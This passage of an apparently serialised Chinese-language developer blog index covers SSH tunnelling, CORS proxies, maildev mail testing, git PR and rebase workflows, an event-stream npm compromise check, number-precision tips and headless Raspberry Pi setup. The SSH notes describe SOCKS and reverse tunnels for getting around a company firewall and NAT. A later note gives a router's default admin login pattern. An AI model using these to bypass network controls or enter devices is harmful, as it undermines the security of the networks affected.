Free Universal Database Tool](https://dbeaver.io/)\n\n連線設定可以設定SSH Tunnel\n這樣以後一鍵迅速連MySQL\n![](https://dbeaver.com/wp-content/uploads/2018/09/redis-connection-ssh.png)\n\n設定非常簡單簡單，也不需要打ssh指令\n\n\n## SSH 相關資料\n\n由於我家裡沒有兩個不同網段\n所以我就沒有實驗\n但基於理解還是仔細爬了一下網路文章\n不太想花太多時間研究\n簡單整理一下\n\n* Local port forwarding\n```\nssh -L <local_port>:<target_host>:<target_port> remote_user@remote_host\n```\n* Remote port forwarding (Reverse SSH)\n```\nssh -R 5900:localhost:22 guest@remote-pc\n```\n* SOCKS Proxy Forwarding\n```\nssh -C -D 8080 cwliu@123.123.123.123\n```\n\n[SSH Tunnel](http://blog.codylab.com/ssh-port-forwarding/)\n{% asset_link web1.png 備份圖 %}\n\nLocal port forwarding 和 SOCKS Proxy Forwarding\n感覺兩個都好像\n\n有看到[上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站](https://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=compact&topic_id=17538)\n{% asset_link web2.png 備份圖 %}\n```\n範例1：\n在公司，透過外面的電腦當proxy，連到外面。\nssh -NfD 8888 remote_ip\n-N : 不執行任何命令\n-f : 在背景執行\n-D : 建socks5 的proxy\n這時候,瀏覽器和msn在socks 5 proxy設定的欄位填上localhost:8888 。\n連出去的連驗就是加密，並且是穿過remot_ip的連線。\n\n範例2:\n在公司，透過外面的電腦連BBS。\nssh -NfL 2323:bbs.gamer.com.tw:23 remote_ip\n-L : 將local port 轉向\ntelnet localhost 2323 就可以連到巴哈，而且是加密的。\n也可用PCManx連localhost 2323也是一樣的意思。\n\n範例3:\n有時候假日，想要連回公司加個班。\n但是公司是NAT，所以沒辦法這樣作。\n可以運用TCP雙向傳輸的特性來辦到這件事。\nssh -NfR 2222:localhost:22 remote_ip\n-R : 將remote port轉向 \n\n....\n\n範例一和範例二差別在於 SOCKS Proxy 的建立。這是因為 HTTP Proxy 會貼上/處理/取下額外的資訊，不能直接轉送(Forwarding)。範例二就真的是照本宣科地轉送。(當然，兩者轉送之前都有加密。)\n```\n\n簡單來說`Local port forwarding`只能對外一個port轉出去，所以不能用在看網頁上面\n但是`SOCKS Proxy Forwarding`就可以對印remote可以連到的主機做連線(而且是多個)\n這個用在網頁上面很方便\n\n\n當然還有查了一些:\n除了目前連mysql感覺其他地方目前用不上\n所以先留著筆記\n\n\n* [SSH Forwarding 內部網路連線 – 繁華上海城 ＆ 邊緣小宅女 – Medium](https://medium.com/@achilles1452/ssh-forwarding-%E5%85%A7%E9%83%A8%E7%B6%B2%E8%B7%AF%E9%80%A3%E7%B7%9A-b79c13e2cdc8?fbclid=IwAR0HpLQ4tZhi5gEOZ37Ii-lS68_1_6ysL3nam7Aimaig1LeOwx1ciljZ9iY)\n{% asset_link web3.png 備份圖 %}\n* [SSH Tunnel](http://blog.codylab.com/ssh-port-forwarding/)\n* [Reverse SSH Tunnel實際運用，搭配auotssh永不斷線，putty建立反向tunnel :: 哇哇3C日誌](https://ez3c.tw/2043)\n* [使用 autossh 建立反向 SSH 连接 · 不立不破](https://blog.windrunner.me/sa/reverse-ssh.html)\n* [利用SSH Tunnel連線至內部網路 - LinXblog](https://gwokae.mewggle.com/wordpress/2010/08/%E5%88%A9%E7%94%A8ssh-tunnel%E9%80%A3%E7%B7%9A%E8%87%B3%E5%85%A7%E9%83%A8%E7%B6%B2%E8%B7%AF/)\n* [用 SSH Tunnel 來避免防火牆阻擋實作與反制 | Mr. 沙先生](https://shazi.info/%E7%94%A8-ssh-tunnel-%E4%BE%86%E9%81%BF%E5%85%8D%E9%98%B2%E7%81%AB%E7%89%86%E9%98%BB%E6%93%8B%E5%AF%A6%E4%BD%9C%E8%88%87%E5%8F%8D%E5%88%B6/)\n* [玩转SSH端口转发 | Fundebug博客](https://blog.fundebug.com/2017/04/24/ssh-port-forwarding/)\n* [87showmin的筆記本: ssh port forwarding using Putty](http://87showmin.blogspot.com/2012/06/ssh-port-forwarding-using-putty.html)\n* [SSH Tunnel 通道打造加密 Proxy，透過外部 Linux 伺服器上網 - G. T. Wang](https://blog.gtwang.org/linux/ssh-tunnel-socks-proxy-forwarding-tutorial/)\n* [在 bash 中設定 Proxy server - 蘋果小豬筆記](http://applezulab.netdpi.net/02-linux-xi-tong-cao-zuo/set-proxy-server-in-bash)\n* [What is my IP address? — ifconfig.co](https://ifconfig.co/)\n* [上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站](https://www.ubuntu-tw.org/modules/newbb/viewtopic.php?viewmode=compact&topic_id=17538)\n\n\nDate: 2018-12-20\n\nFilezilla預設沒有做ssh tunnel\n但有找到WinScp能做到\n\n\n* [winScp如何通过隧道代理进行远程连接 - KoMiles - 博客园](https://www.cnblogs.com/wangkongming/p/4124945.html)\n* [WinSCP使用教學 | FAQ Book](http://blog.faq-book.com/?p=1483)\n* [SSH使用教程( Bitvise Tunnelier+Chrome+Proxy Switchy) - 掃文資訊](https://tw.saowen.com/a/b855ee1a0a683498261219a649f983e3d1916ed1974556022a2a5d418fdd100f)\n* [瀏覽器設定 proxy 透過 SSH Tunnel 連線網站 | SSORC.tw](https://ssorc.tw/6866)\n* [DownloadManager实现版本更新，监听下载进度 - 简书](https://www.jianshu.com/p/bb4cde6e88c6)\n\n","tags":["port forward"],"categories":["MySQL"]},{"title":"cors跨域資源共享代理(proxy)小記","url":"%2Fblog%2F2018%2F12%2F13%2Fcors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98%2F","content":"\n最近使用cors anywhere\n簡單使用\n有遇到不該遇到的雷\n這邊小記\n\n<!--more-->\n\n# CORS-ANYWHERE\n\n官網：https://cors-anywhere.herokuapp.com/\nGithub：https://github.com/Rob--W/cors-anywhere/\n\n可以到官網clone下來，執行node js\n\n\n## 踩雷小記\n\n原本我就簡單使用`fetch`呼叫cors-anywhere，但是一直失敗\n其實我也是英文苦守\n當下沒注意到有明顯提示\n\n```\nMissing required request header. Must specify one of: origin,x-requested-with\n```\n\nfetch並不會塞`x-requested-with`\n當然在postman塞`x-requested-with`\n就可以work了\n\n\n## Corsproxy\n\n可以全局安裝\n```\nnpm install -g corsproxy\ncorsproxy\n```\n\n但一樣有上面的雷\n說不定只有我會踩到orz\n\n也可以去docker hub找\n\n","tags":["cors"],"categories":["實用工具"]},{"title":"maildev試用筆記","url":"%2Fblog%2F2018%2F12%2F09%2Fmaildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98%2F","content":"\n最近在FB社群看到有人分享fake stmp server\n[社群連結](https://www.facebook.com/groups/javascript.tw/permalink/1620946454673353/)\n之前有測試nodemailer\n但是缺少附加檔案可以測試\n[preview-email - npm](https://www.npmjs.com/package/preview-email)無法做到\n想說測試這個能不能用\n\n<!--more-->\n\n線上服務\n[Ethereal Email](https://ethereal.email/?fbclid=IwAR1_1vsbOR2U5V3MeFFCyNAvvbkh4gVQxtyif-oJZrhDTdtFQMdUmAKLuG8)\n[Mailtrap.io — Fake smtp testing server. Dummy smtp email testing](https://mailtrap.io/)\n不過...，這兩個不是這文章的重點\n\n\n## maildev 安裝\n\n官網[MailDev - Create better email during development](https://danfarrelly.nyc/MailDev/?fbclid=IwAR26sE6dCMfjn9xeNhWJh_nLfw3cTiPu-pr5F9nd0qJyykPCaI7ihQDBR-8)寫了很清楚\n\n### npm安裝\n\n```\n  $ npm install -g maildev\n  $ maildev\n```\n### docker執行\n\n```\n  $ docker pull djfarrelly/maildev\n  $ docker run -p 1080:80 -p 1025:25 djfarrelly/maildev\n```\n\n### 原始檔案暗樁\n\n```\n  $ git clone git@github.com:djfarrelly/MailDev.git\n  $ npm install -g ./maildev\n  $ maildev\n```\n\n## 安全憑證記得要關掉\n\n```js\n  const transport = nodemailer.createTransport({\n    port: 1025,\n    ignoreTLS: true,\n    // other settings...\n  });\n\n```\n\n### 程式碼執行\n\n拿[malagege/sample-code-node-mail-batch: 批次發信範例](https://github.com/malagege/sample-code-node-mail-batch)test_add_file.js\n修改\n主要要特別注意\n* ignoreTLS: true\n* auth要拿掉\n* cid 在多個寄信的時候會在寄信的時候會有問題....\n明明個別設定1.jpg,2.jpg，但是結果兩封信卻都是2.jpg\n最後用`cid:00000001${data.img}`方式解決...\n但感覺是maildev問題...\n\n以下code也沒先commit到github上面\n```js\n/////////(1)\nconst csvFilePath='data.csv'\nvar mail_from = 'from@xxxx.com.tw'\nvar subject = '標題'\n\n\nvar nodemailer = require('nodemailer');\nconst csv=require('csvtojson')\n/////////(2)\nvar transporter = nodemailer.createTransport({\n    host: 'localhost',\n    port: 1025 ,\n    ignoreTLS: true,\n    // auth: {\n    //     user: 'from@xxxx.com.tw',\n    //     pass: 'password'\n    // }\n});\ncsv()\n.fromFile(csvFilePath)\n.then((jsonObj)=>{\n    // console.log(jsonObj);\n    /**\n     * [\n     * \t{a:\"1\", b:\"2\", c:\"3\"},\n     * \t{a:\"4\", b:\"5\". c:\"6\"}\n     * ]\n     */ \n\n    jsonObj.forEach(data => {\n        /////////(3)\n        let mail_to = data.usermail\n        let email_template = `\n        Hello World!!!!${data.img}\n        <img src=\"cid:00000001${data.img}\"/><br>\n        姓名：${data.username}<br>\n        訂單編號：${data.no}<br>\n        `\n\n        let mailOptions = {\n          from: mail_from,\n          to: mail_to,     //寄送人\n          subject: subject,\n          html: email_template,\n          attachments: [{\n            filename: data.img,\n            path: data.img,\n            cid: '00000001'+data.img\n          }]\n        };\n        \n      \n      // verify connection configuration\n      // transporter.verify(function(error, success) {\n      //   if (error) {\n      //        console.log(error);\n      //   } else {\n      //        console.log('Server is ready to take our messages');\n      //   }\n      // });\n      \n      transporter.sendMail(mailOptions, function(error, info) {\n        if (error) {\n          console.log('mail_to:' + mail_to)\n          console.log(error);\n        } else {\n          console.log(mail_to + ' , Email sent: ' + info.response);\n        }\n      });\n      \n      });\n\n})\n```","tags":["mail"],"categories":["Nodejs"]},{"title":"gitea試玩合併分支(PR)","url":"%2Fblog%2F2018%2F12%2F06%2Fgitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR%2F","content":"\n最近試玩一下gitea\n使用`choco install  gitea`\n順利安裝成功\n預設第一個申請帳號會是管理者\n\n<!--more-->\n\n直接進入主題\n\n之前有在想PR後，分支會變成什麼狀況??\n今天實驗用一般PR\n合併PR會有兩條branch\n{% asset_img 1.jpg 合併PR會有兩條branch %}\n\n\n---------\n\n## gitea 合併分支有兩個選項\nPR還有兩種branch(rebase,squash)\n{% asset_img 2.jpg 另外兩種分支 %}\n\n稍微google一下\n[使用 git rebase 提高 PR 质量 - 掘金](https://juejin.im/post/59c7b00df265da065e323acf)\n{% asset_link web.png 備份圖 %}\n\n~~不過我覺得PR在不傷commit情況下，一般合併應該就可以了~~\n\n由於最近在想公司\n\n## revert無法取笑merge branch\n\n最近還發現revert不能取消merge branch\n雖然我會用`git reset`\n但還是有找了一下\n[Git怎样撤销一次分支的合并Merge - SegmentFault 思否](https://segmentfault.com/q/1010000000140446)\n[git/revert-a-faulty-merge.txt at master · git/git](https://github.com/git/git/blob/master/Documentation/howto/revert-a-faulty-merge.txt)\n[git revert 讓提交不再害怕 - IT閱讀](https://www.itread01.com/content/1531335500.html)\n\n有機會情境用到來測試看看...\n\n## PR衝突解決方法\n\n也有爬到PR可能會衝突解決辦法\n~~不過還沒有實驗，先記錄~~\n\n經過實驗得到很驚奇的結果\nPR假如會發生衝突，gitea或gitlab不會讓你做合併動作(按鈕會變灰色的)\n但要如何修正呢\n\n當然就一般兩種\n\n* merge \n先加入fork remote的資訊，在做`master`做`git pull add_remote_name`\n正常會遇到衝突\n就直接解這個問題(git merge --continue)\ngit push上去後，PR那個merge按鈕應該就可以按了\n\n**但這個有嚴重的缺點，會自動產生merge commit**\n其實這也不是缺點，保留當下時間的commit也只有這個方法\n\n所以為了好看，大部分應該都會選擇rebase\n[使用 git rebase 避免無謂的 merge | ihower { blogging }](https://ihower.tw/blog/archives/3843)\n\n* rebase\n先加入fork remote的資訊，在做`master`做`git pull --rebase add_remote_name`\n正常會遇到衝突\n就直接解這個問題(git rebase --continue)\n正常你的repo應該只有你一個人\n之前的commit會改變\n可能需要`git push -f`\n但有多人的話`git push --force-with-lease`\n與多人衝突要怎麼辦??\n這時候可能只能用`merge`方法，但如先前所說會有缺點\n[Git 更安全的强制推送，--force-with-lease - walterlv](https://walterlv.com/post/safe-push-using-force-with-lease.html)\n\n相關資料:\n* [Github 發 Pull Request & 貢獻流程速查](https://gist.github.com/timdream/5968469#%E6%83%85%E5%A2%83pull-request-%E9%81%8E%E6%9C%9F%E7%84%A1%E6%B3%95%E5%90%88%E4%BD%B5)\n* [Git 更安全的强制推送，--force-with-lease - walterlv](https://walterlv.com/post/safe-push-using-force-with-lease.html)\n* [自己提交的 pull request 一直是 open，这个意思说一直在审核期吗？是不是说进入 close 了 就是审核通过了？ - V2EX](https://www.v2ex.com/t/184888)\n(https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/)\n* [Git: 更新分支+解衝突 | Summer。桑莫。夏天](https://cythilya.github.io/2018/05/27/git-merge-and-solve-conflict/)\n* [Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天](https://cythilya.github.io/2018/05/29/git-merge-squash-vs-rebase-squash/)\n* [git pull --rebase vs git rebase : what's the danger? - Stack Overflow](https://stackoverflow.com/questions/38017517/git-pull-rebase-vs-git-rebase-whats-the-danger)\n\n## git pull --rebase\n\n這個東西非常玄\n印象中感覺`Github Desktop`會做`git pull --rebase`\n所以好像很少會產生merge branch commit\n\n`git pull --rebase = git fetch + git rebase`\n\n發現git rebase , git merge 合併預設remote可以省略\n詳細裡面內容\n* [Git: 更新分支+解衝突 | Summer。桑莫。夏天](https://cythilya.github.io/2018/05/27/git-merge-and-solve-conflict/)\n* [Git: 比較 Merge Squash 與 Rebase Squash | Summer。桑莫。夏天](https://cythilya.github.io/2018/05/29/git-merge-squash-vs-rebase-squash/)\n{% asset_link web2.png 備份圖 %}\n還有Squash，感覺可以應用比較特別情境上面\n先留著筆記\n\n\n## PR  其實local端也可以做到\n\n參考gitlab說明\n{% asset_img 3.png gitlab上面local合併說明 %}\n~~不過有好PR功能不用嗎o.<~~\n\n\n## 怎麼快速了解git ours和theirs\n\n查看裡面說明，講得很清楚\n[化解冲突：git merge 与 git rebase 中的 ours 和 theirs | Ming's Blog](https://bitmingw.com/2017/02/16/git-merge-rebase-ours-and-theirs/)\n\n> 可以看出，<<<<<<< 和 >>>>>>> 清晰地标示出了冲突的部分。你需要将它们改成期望的样子。如果你想保留两个版本中的一个而不引入新的修订，就可以使用两个预先定义的代词。<<<<<<< 和 ======= 之间的部分称为 ours, ======= 和 >>>>>>> 之间则称为 theirs. 此时，你只需要键入合适的指令即可化解冲突，而不需要进入文本编辑器。在当前项目可以得到如下运行结果\n\n不過...，rebase是相反的\n我這邊猜rebase因為是把`另外分支`為基準\n所以自己的code可能算在theirs(自己猜測)\n\n## git rebase小記\n\n從開始commit開始做\n舊的commit會從`上面依序往下排`\n`git rebase -i --root`\n\n* [沈弘哲 - YouTube](https://www.youtube.com/user/blue524326/videos)\n* [git pull vs git pull --rebase - YouTube](https://www.youtube.com/watch?v=8h0K-2OaeSk)\n* [git rebase interactive - reword - PART 1 - YouTube](https://www.youtube.com/watch?v=JhY0rR2wQq0&t=3s)\n* [git rebase interactive - edit - PART 2 - YouTube](https://www.youtube.com/watch?v=TCKjQppHxxQ)\n* [git rebase interactive - squash fixup - PART 3 - YouTube](https://www.youtube.com/watch?v=bfrZrbEHis0)\n* [(20) git rebase interactive - exec drop - PART 4 - YouTube](https://www.youtube.com/watch?v=u8imRiiSyzk)\n\n\n題外話，剛剛我筆電(elementaryos, git 2.7.x)做`git log`確沒有顯示HEAD跟remote資訊\n查了一下，需要加`--decorate`\n疑似之後2.13的git預設是`--decorate`\n[git log - How to make git log decorate by default - Stack Overflow](https://stackoverflow.com/questions/21607305/how-to-make-git-log-decorate-by-default)","tags":["git"],"categories":["Git"]},{"title":"nodejs event stream被植入比特幣小記","url":"%2Fblog%2F2018%2F11%2F29%2Fnodejs-event-stream%E8%A2%AB%E6%A4%8D%E5%85%A5%E6%AF%94%E7%89%B9%E5%B9%A3%E5%B0%8F%E8%A8%98%2F","content":"\n最近npm的`event stream`吵得沸沸揚揚的\n竟然有人偷偷植入挖幣程式在裡面\n只要有import都會中標\n這篇指記錄有沒有中標\n\n<!--more-->\n\n```bash\nnpm ls event-stream flatmap-stream\n```\n```bash\nnpm ls -g event-stream flatmap-stream\n```\n\n{% asset_img 1.png 指令 %}\n\n參考來源:[吃瓜群众带你了解 NMP 包 event-stream 被植入比特币后门的来龙去脉-前端开发博客](http://caibaojian.com/event-stream.html)\n\n更多八卦....\n[月下载量千万的 npm 包被黑客篡改，Vue 开发者可能正在遭受攻击 - 知乎](https://zhuanlan.zhihu.com/p/50938220?fbclid=IwAR01keb43yqDo_1AqH9WMGpGiDzmSx47TfDuoneElZmKDKsPmi-TrFuFqf0)\n","categories":["JavaScript"]},{"title":"JAVA BigDicmal 精度運算筆記 與  精度運算一些事","url":"%2Fblog%2F2018%2F11%2F29%2FJAVA-BigDicmal-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E7%AD%86%E8%A8%98-%E8%88%87-%E7%B2%BE%E5%BA%A6%E9%81%8B%E7%AE%97%E4%B8%80%E4%BA%9B%E4%BA%8B%2F","content":"\n最近因為公司最近要改報表公式\n因為對BigDicmal不是很熟\n所以又特別翻了一下\n這邊簡單說明一下，城市運算很大數字會失準\n所以必須用別的方法算出正確數字\n\n<!--more-->\n\n```java\nrs.getBigDecimal(\"num\").multiply(new BigDecimal(Double.valueOf(1.245))).setScale(0, BigDecimal.ROUND_HALF_UP);\n```\n[瓦特希諾生活記錄: BigDecimal 四捨五入](http://fireball-catcher.blogspot.com/2012/09/bigdecimal.html)\n[BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象](http://www.xwood.net/_site_domain_/_root/5870/5874/t_c257486.html)\n\nsetScale(0`, BigDecimal.ROUND_HALF_UP`);\n後面`, BigDecimal.ROUND_HALF_UP`一定要帶入\n否則當四捨五入會跳出Exception\n\n>You have two BigDecimal numbers both of which require over a 1000 decimal places. Trying to set the scale to only have 113 decimal places means you will lose precision and therefore you need to round.\n\nYou can use the setScale methods that take a RoundingMode to prevent the exception but not the rounding.\n\n[java - Rounding necessary with BigDecimal numbers - Stack Overflow](https://stackoverflow.com/questions/10734230/rounding-necessary-with-bigdecimal-numbers)\n\n\n\n\n> System.out.println(\"12.5的四舍五入值：\" + Math.round(12.5));\n* [java提高篇(三)-----java的四舍五入 - chenssy - 博客园](https://www.cnblogs.com/chenssy/p/3366632.html)\n* [使用BigDecimal进行精确运算 - chenssy - 博客园](https://www.cnblogs.com/chenssy/archive/2012/09/09/2677279.html)\n\n\n* [Java Tutorial 第二堂（1）數值與字串型態 by caterpillar | CodeData](http://www.codedata.com.tw/java/java-tutorial-the-2nd-class-1-numeric-types-and-string/)\n* [Java BigDecimal詳解，提供了豐富的四捨五入規則 - 掃文資訊](https://hk.saowen.com/a/b9a749edc4f667a5fe6260bb56bd5822807cb65d2312b5153f8c9a3171e5cbb1)\n* [BigDecimal通过setScale设置小数位数发生ArithmeticException - 小木人印象](http://www.xwood.net/_site_domain_/_root/5870/5874/t_c257486.html)\n* [BigDecimal.setScale 处理java小数用法 - 天涯海角的博客 - CSDN博客](https://blog.csdn.net/qq_36497605/article/details/70597318)\n* [BigDecimal.setScale()方法 - lilie008的专栏 - CSDN博客](https://blog.csdn.net/lilie008/article/details/38318485)\n\n\n### PHP   也有浮點數算術問題\n\n\n```PHP浮點型在進行+-*%/存在不準確的問題\n例如：\n1.\n$a = 0.1;\n$b = 0.7;\nvar_dump(($a + $b) == 0.8);\n打印出來的值為 boolean false\n這是為啥?PHP手冊對於浮點數有以下警告信息:\nWarning\n浮點數精度\n顯然簡單的十進制分數如同 0.1 或 0.7 不能在不丟失一點點精度的情況下轉換為內部二進制的格式。這就會造成混亂的結果：例如，floor((0.1+0.7)*10) 通常會返回 7 而不是預期中的 8，因為該結果內部的表示其實是類似 7.9999999999…。\n這和一個事實有關，那就是不可能精確的用有限位數表達某些十進制分數。例如，十進制的 1/3 變成了 0.3333333. . .。\n所以永遠不要相信浮點數結果精確到了最後一位，也永遠不要比較兩個浮點數是否相等。如果確實需要更高的精度，應該使用任意精度數學函數或者 gmp 函數\n```\n[黃聰：php精度計算問題 - 掃文資訊](https://hk.saowen.com/a/1a3866ccb1c370b2fbcba7841ef434c1b80246a5666867cb549023af83b2088e)\n```php\necho .1 + .2;    //0.3\nvar_dump(.1 + .2); //float(0.30000000000000004441)\n\n//  PHP echo converts 0.30000000000000004441 to a string and shortens it to “0.3”. To achieve the desired floating point result, adjust the precision ini setting: ini_set(“precision”, 17).\n```\n[0.30000000000000004.com/](https://0.30000000000000004.com/)\n\n```\nThese functions are only available if PHP was configured with --enable-bcmath . \n\nbcmath ist not installed automatically with php 7 on linux (ubuntu server)\nYou have to use: sudo apt-get install php-bcmath\n```\n[PHP: Installation - Manual](http://php.net/manual/en/bc.installation.php)\n\n## 倍精轉數字小筆記\n\n### PHP倍精變成數字(字串)\n```php\nnumber_format(1.2378147769392E+14,0,'','')\n```\n[Convert exponential to a whole number in PHP - Stack Overflow](https://stackoverflow.com/questions/4964059/convert-exponential-to-a-whole-number-in-php/4964120#4964120)\n\n### PHP 數字字串(with comma)轉乘數字\n```php\n$number = '1,000';\n$number = (int) filter_var($number, FILTER_SANITIZE_NUMBER_INT);\nvar_dump($number);\n```\nOr\n```php\n$number = '1,000.5669';\n$number = (float) str_replace(',', '', $number);\nvar_dump($number);\n```\n[getting int value from comma separated number php - Stack Overflow](https://stackoverflow.com/questions/25966365/getting-int-value-from-comma-separated-number-php)\n\n### MySQL 倍精變成數字(字串)\n```sql\nselect REPLACE(FORMAT(100000000000000000000000000000000000000, 0), ',', '')\n```\n\nMySQL 轉型型態方法\n[[資料庫] 如何轉換 Mysql varchar type 到 int type | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY](https://blog.wu-boy.com/2010/12/%E8%B3%87%E6%96%99%E5%BA%AB-%E5%A6%82%E4%BD%95%E8%BD%89%E6%8F%9B-mysql-varchar-type-%E5%88%B0-int-type/)\n\n\n\n[使用浮點數最最基本的觀念 / 一般討論區 / 程式設計俱樂部](http://www.programmer-club.com.tw/ShowSameTitleN/general/6768.html)\n[為什麼在項目中要儘量避免使用浮點數，不使用浮點數，那該如何計算浮點數？ - 知乎](https://www.zhihu.com/question/65960911)\n[CODE-分贓程式的寫法-黑暗執行緒](https://blog.darkthread.net/blog/about-money-distribution/)\n什麼時候要用浮點數、什麼時候要用倍精?\n我目前來看在算錢，尤其算拆分比(有用到乘除)算到有小數點會影響到\n盡可能用bigdicmal這種東西\n","tags":["bigdicmal"],"categories":["程式心法"]},{"title":"git刪除遠端(remote)分支和強制pull下來分支","url":"%2Fblog%2F2018%2F11%2F26%2Fgit%E5%88%AA%E9%99%A4%E9%81%A0%E7%AB%AF-remote-%E5%88%86%E6%94%AF%2F","content":"\n最近專案有新的需求\n剛好用git刪除舊分支\n遠端分支還是存在\n沒刪掉就感覺少了什麼\n\n<!--more-->\n\n## git刪除遠端(remote)分支\n\n`git push origin :cat`\n\n> $ git push origin master:cat\n意思就是要把本地的 master 分支推上去之後，在 Server 上建立 cat 分支。如果把這個指令前面的 master 拿掉：\n$ git push origin :cat\n就像是推了空的內容去更新線上的 cat 分支的內容，也算是變相的把該分支刪除。只是使用 Push 指令刪分支，有一點不直覺而已。\n\n參考來源：[【狀況題】怎麼刪除遠端的分支？ - 為你自己學 Git | 高見龍](https://gitbook.tw/chapters/github/delete-remote-branch.html)\n\n用空分支上傳覆蓋空分支，這個記法真的很方便\n\n\n\n## 強制pull下來分支\n\n```\nI think this is the right way:\n\ngit fetch --all\n\nThen, you have two options:\n\ngit reset --hard origin/master\n\nOR If you are on some other branch:\n\ngit reset --hard origin/<branch_name>\n\n```\n參考來源:[version control - How do I force \"git pull\" to overwrite local files? - Stack Overflow](https://stackoverflow.com/questions/1125968/how-do-i-force-git-pull-to-overwrite-local-files)\n\n`git fetch --all` 是更新 \"所有\" remote 底下的分支\n\n但沒想到reset大法可以解決XD\n\n\n\n其他重點小記\n[[译] 使用 `-force` 被认为是有害的；了解 Git 的 `-force-with-lease` 命令 - 掘金](https://juejin.im/post/5985b9c56fb9a03c376de762)","tags":["git"],"categories":["Git"]},{"title":"Raspberry PI 3B設定wifi連線方法","url":"%2Fblog%2F2018%2F11%2F19%2FRaspberry-PI-3B%E8%A8%AD%E5%AE%9Awifi%E9%80%A3%E7%B7%9A%E6%96%B9%E6%B3%95%2F","content":"\n最近衝了PI 3，因為沒有多的網路線\n目前簡單做個wifi設定筆記\n\n<!--more-->\n\n## 設定ssh\n不知道哪個版本就開始要放置sd檔案上面放`ssh`檔案(touch ssh)\n開機才會自動開啟ssh server\n\n當然有上次經驗，我猜想wifi設定應該也有設定的地方\ngoogle一下，果然不出我所料\n\n\n## 設定wifi\n\nboot磁區新增一個`wpa_supplicant.conf`檔案，內容如下\n```\ncountry=TW\nctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev\nupdate_config=1\n\nnetwork={\n    ssid=\"SSID_NAME\"\n    psk=\"SSID_KEY\"\n    key_mgmt=WPA-PSK\n    scan_ssid=1\n}\n\n```\n\n原理如下\n```\n請注意！！！\n如果是用 Windows 的朋友，千萬不要用「記事本」去編輯，它編出來的純文字檔，在 Linux 讀取會有問題，請改用 Sublime Text、EmiEditor、Notepad++ .... 等支援 Linux 格式的編輯器來編輯。\n\n該輸入的資料全部輸入完畢之後，別忘了存檔，而且要正確的把記憶卡退出電腦，可別直接拔了就走。\n\n接著只要把記憶卡插上 Raspberry Pi 上開機就行了，Rasbian 會把 /boot/wpa_supplicant.conf 複製到 /etc/wpa_supplicant/ 目錄裡，然後就會去讀取裡面的設定值，自動連上無線基地台了。\n```\n參考:[Raspberry Pi 的基礎 - 沒螢幕、沒鍵盤、沒網路，居然也能設定 Wi-FI 連線 | IT 技術家](http://blog.itist.tw/2017/03/headless-wifi-setup-without-monitor-keyboard-or-cables-for-raspberry-pi-zero-w-and-3-model-b.html)\n[邊玩邊學，輕鬆自學 칸: [樹莓派][Raspberry Pi] 樹莓派無頭式安裝教學（一）- wifi + ssh](https://khanwhlee.blogspot.com/2017/05/wifi-ssh.html?fbclid=IwAR1oGeb690-RkyXFatZM__lvmOc4DrnstVDEfMDLeWGnSrPcrX0TMarjNCk)\n\n## 要怎麼知道IP\n\n登入中華電信小烏龜看IP，發現中華電信P883竟然改IP密碼\n可能是為了安全性...\nP883帳號密碼為cht/p883(+mac後面四碼)\n怎麼看到mac呢\n網路上說可以登入user/user進去看mac\n另外一種是`arp -a`我自己想的\n有機會看到\n登入p883就能知道IP\n\n最後，只要有開ssh跟wifi後樹梅派接電就能ssh控制使用，真的很方便\n留著下次用的時候再翻閱XD"},{"title":"手邊PHP一些note...","url":"%2Fblog%2F2018%2F11%2F15%2F%E6%89%8B%E9%82%8APHP%E4%B8%80%E4%BA%9Bnote%2F","content":"\n最近發現PHP function宣告寫在下面\n竟然上面可以呼叫...\n我以為是JavaScript的hoisting一樣的東西？\n剛好看的[我知道你懂 hoisting，可是你了解到多深？ | TechBridge 技術共筆部落格](https://blog.techbridge.cc/2018/11/10/javascript-hoisting/?fbclid=IwAR0DxYCVyKD-y1WkcFn3IumG9IUlGd6GyASAeMhvRGe13C4qK1ps_5e6-pw)\n只有略懂略懂...\n但為什麼可以呼叫呢？\n目前還沒找到原因\n所以先整理出來\n\n<!--more-->\n\n在這邊我先說我的猜測**不一定是正確原因**\n原本想說PHP的function name會不會跟`常數`是用同一個地方\n結果是了一下，發現常數竟然有分大小寫，但感覺不會跟變數衝到....\n好神奇，可能JS寫太久，覺得怪怪的 哈哈\n\n* [PHP - calling a function before it is declared - Stack Overflow](https://stackoverflow.com/questions/27211326/php-calling-a-function-before-it-is-declared)\n\n> Functions need not be defined before they are referenced, except when a function is conditionally defined as shown in the two examples below.\n\n這邊就說明了function放後面，可以呼叫。還可以透過`Conditional functions`這東西，這也滿奇怪的\n* [PHP: 用户自定义函数 - Manual](http://php.net/manual/zh/functions.user-defined.php)\n\n中間有想到是不是`常數`跟function一樣可以放後面\n但**答案是不行的**\n\n\n\n* [PHP: 超全局变量 - Manual](http://php.net/manual/zh/language.variables.superglobals.php)\n\n* [彻底搞懂PHP的变量作用域和全局变量 - 简书](https://www.jianshu.com/p/09217582cc08)\n```php\nfunction test() { \n    global $a; \n    unset($a); \n} \n$a = 1; \ntest(); \necho $a; \n```\n结果\n\n    明明是unset了呀，为什么还会打印出来呢？\n    众所周知，我们的function里面的永远是个私有变量，unset的确是起作用了，它unset了一个global 的值呀，而global在函数产生一个指向函数外部变量的别名变量，而不是真正的函数外部变量；$GLOBALS[]确确实实调用是外部的变量，函数内外会始终保持一致！\n\n作者：michaelgbw\n链接：https://www.jianshu.com/p/09217582cc08\n來源：简书\n简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。\n\n老實說...，我還是沒有搞清楚\n但這樣看下去，可能還有static要看\n\n* [PHP: Userland Naming Guide - Manual](http://php.net/manual/en/userlandnaming.php)\n* [PHP 5.3/6 新增功能 - Namespace - 